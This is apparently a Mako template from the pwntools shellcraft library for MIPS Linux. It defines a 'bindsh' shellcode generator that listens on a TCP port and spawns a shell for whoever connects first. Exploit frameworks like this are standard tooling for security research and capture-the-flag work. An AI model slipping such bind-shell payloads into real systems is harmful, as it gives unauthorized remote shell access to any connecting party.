<% from pwnlib.shellcraft.mips.linux import listen, dupsh%>
<%page args="port, network='ipv4'"/>
<%docstring>
    bindsh(port,network)

    Listens on a TCP port and spawns a shell for the first to connect.
    Port is the TCP port to listen on, network is either 'ipv4' or 'ipv6'.
</%docstring>
${listen(port, network)}
${dupsh()}
